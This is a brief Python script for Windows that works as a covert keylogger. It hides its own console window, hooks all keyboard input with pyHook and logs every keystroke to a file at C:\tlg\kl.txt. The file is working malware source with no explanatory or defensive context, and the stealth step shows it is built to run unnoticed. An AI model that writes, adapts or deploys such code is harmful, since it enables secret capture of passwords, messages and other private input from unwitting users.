import pyHook, pythoncom, sys, logging, os, win32console, win32gui

stealth = win32gui.FindWindow("ConsoleWindowClass", None)
win32gui.ShowWindow(stealth,0)


dest_log = 'C:\\tlg\\kl.txt'

dir = os.path.dirname(dest_log)
if not os.path.exists(dir):
    os.makedirs(dir)

def OnKeyboardEvent(event):
    logging.basicConfig(filename=dest_log,level = logging.DEBUG, format='%(message)s')
    event.Key
    logging.log(10, event.Key,)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
